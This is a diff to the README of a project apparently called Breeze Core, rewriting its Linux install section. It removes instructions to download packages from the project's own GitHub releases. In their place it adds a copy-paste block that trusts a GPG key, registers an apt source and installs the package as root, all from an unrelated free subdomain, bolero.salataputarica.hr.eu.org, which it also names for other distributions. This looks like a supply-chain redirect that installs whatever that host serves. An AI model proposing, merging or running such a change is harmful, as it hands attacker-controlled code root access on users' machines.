@@ -70,20 +70,25 @@ Then open **`http://<this-computer's-IP>:8420`** in a browser. Compose file, upd
 
 Download **`Breeze-Core-Setup.exe`** from the [latest release](https://github.com/monikapurpl3/breeze-core/releases/latest) and run it. It sets Breeze Core up as a background service and offers to find your units for you — no commands to type. Full walkthrough → [docs/WINDOWS.md](docs/WINDOWS.md).
 
-### 🐧 Linux — install a package, no Python needed
+### 🐧 Linux — add the package repo, updates included
 
-Each release ships **self-contained packages** (server + web UI + private
-runtime in one — nothing else to install). Download yours from the
-[latest release](https://github.com/monikapurpl3/breeze-core/releases/latest):
+Self-contained packages (server + web UI + private runtime — no Python
+needed) from the **signed package repository**, so `apt upgrade` /
+`dnf upgrade` / `pacman -Syu` / `apk upgrade` keep you current. The
+copy-paste setup for your family is on
+**[bolero.salataputarica.hr.eu.org](https://bolero.salataputarica.hr.eu.org)** —
+for example, Debian/Ubuntu/Mint/Pi OS:
 
-| Your system | Package | Install |
-|---|---|---|
-| Debian · Ubuntu · Mint · Pop!_OS · Raspberry Pi OS · Armbian · Devuan | `….deb` (`amd64`/`arm64`) | `sudo apt install ./breeze-core_*.deb` |
-| Fedora · RHEL · AlmaLinux · Rocky · openSUSE · SLE | `….rpm` | `sudo dnf install ./breeze-core-*.rpm` (or `zypper in --allow-unsigned-rpm`) |
-| Arch · Manjaro · Artix | `….pkg.tar.zst` | `sudo pacman -U breeze-core-*.pkg.tar.zst` |
-| Alpine | `….apk` | `sudo apk add --allow-untrusted ./breeze-core_*.apk` |
-| Void · Gentoo · anything else | `….tar.gz` (glibc or musl) | unpack, `sudo ./install.sh` |
-| NixOS | it's a flake | `services.breeze-core.enable = true;` — see [docs/PACKAGES.md](docs/PACKAGES.md#nixos--nix) |
+```bash
+curl -fsSL https://bolero.salataputarica.hr.eu.org/breeze-core.asc \
+  | sudo gpg --dearmor -o /usr/share/keyrings/breeze-core.gpg
+echo "deb [signed-by=/usr/share/keyrings/breeze-core.gpg] https://bolero.salataputarica.hr.eu.org/deb stable main" \
+  | sudo tee /etc/apt/sources.list.d/breeze-core.list
+sudo apt update && sudo apt install breeze-core
+```
+
+(rpm, pacman, and apk repos are there too. Prefer a one-off download — or run
+Void/Gentoo/NixOS? → [docs/PACKAGES.md](docs/PACKAGES.md).)
 
 Then three commands:
 
